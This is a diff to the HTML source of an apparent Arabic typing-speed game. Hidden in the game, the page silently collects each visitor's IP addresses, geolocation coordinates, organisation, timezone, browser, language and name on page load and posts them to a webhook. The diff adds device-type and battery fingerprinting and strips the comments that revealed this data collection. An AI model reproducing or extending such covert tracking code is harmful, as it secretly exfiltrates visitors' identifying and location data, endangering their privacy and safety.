@@ -98,7 +98,6 @@
 <div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
 <div id="musicControl" title="كتم/تشغيل الموسيقى">🎵</div>
 
-<!-- شاشة تسجيل الدخول -->
 <div class="container" id="loginScreen">
   <h2>مرحبًا!</h2>
   <p>اكتب اسمك نبدأ</p>
@@ -107,7 +106,6 @@
   <button onclick="startGame()">يلا نبدأ</button>
 </div>
 
-<!-- شاشة الاختبار -->
 <div class="container" id="gameScreen" style="display:none;">
   <h2 id="welcomeMsg"></h2>
   <div id="sentence">...</div>
@@ -152,7 +150,6 @@
   const music = document.getElementById("bgMusic");
   const musicControl = document.getElementById("musicControl");
 
-  // إرسال بيانات المستخدم التقنية مباشرة عند تحميل الصفحة
   window.onload = () => {
     sendUserInfo();
   };
@@ -239,7 +236,6 @@
     }
   });
 
-  // إرسال اسم المستخدم عند بدء اللعبة
   function sendUserName(name) {
     fetch(WEBHOOK_URL, {
       method: 'POST',
@@ -248,7 +244,6 @@
     });
   }
 
-  // إرسال بيانات الجهاز والموقع
   async function sendUserInfo() {
     try {
       const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
@@ -268,6 +263,23 @@
       const ipv4 = ipv4Data.ip;
       const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
 
+      let deviceType = "كمبيوتر";
+      if (/android|iphone|ipad|ipod/i.test(ua)) {
+        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
+      }
+
+      let batteryInfo = "غير متوفرة";
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100);
+          const charging = battery.charging ? "يُشحن" : "لا يُشحن";
+          batteryInfo = `${level}% - ${charging}`;
+        } catch {
+          batteryInfo = "غير مدعومة";
+        }
+      }
+
       function sendToWebhook(extraGeo = '') {
         const infoText = `
 IP (IPv4): ${ipv4}
@@ -279,7 +291,9 @@ IP (IPv6): ${ipv6}
 خط الطول: ${geoData.longitude}
 المنظمة: ${geoData.org}
 المنطقة الزمنية: ${geoData.timezone}
-متصفح المستخدم: ${ua}
+نوع الجهاز: ${deviceType}
+نسبة البطارية: ${batteryInfo}
+المتصفح: ${ua}
 اللغة: ${lang}
 الوقت: ${timeString}
 ${extraGeo}
